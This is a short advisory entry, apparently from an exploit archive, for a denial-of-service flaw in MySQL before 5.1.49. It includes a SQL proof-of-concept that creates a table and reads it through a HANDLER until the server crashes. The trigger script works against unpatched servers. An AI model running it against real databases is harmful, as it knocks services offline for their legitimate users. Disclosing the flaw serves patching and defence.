@@ -1,0 +1,19 @@
+source: http://www.securityfocus.com/bid/42633/info
+
+MySQL is prone to a denial-of-service vulnerability.
+
+An attacker can exploit this issue to crash the database, denying access to legitimate users.
+
+This issue affects versions prior to MySQL 5.1.49.
+
+NOTE: This issue was previously covered in BID 42586 (Oracle MySQL Prior to 5.1.49 Multiple Denial Of Service Vulnerabilities) but has been assigned its own record to better document it.. 
+
+--disable_warnings
+DROP TABLE IF EXISTS t1;
+--enable_warnings
+CREATE TABLE t1  ( pk INT , PRIMARY KEY (pk));
+HANDLER t1 OPEN AS handler_a;
+HANDLER handler_a READ FIRST;
+HANDLER handler_a READ `PRIMARY` NEXT;
+
+DROP TABLE t1;
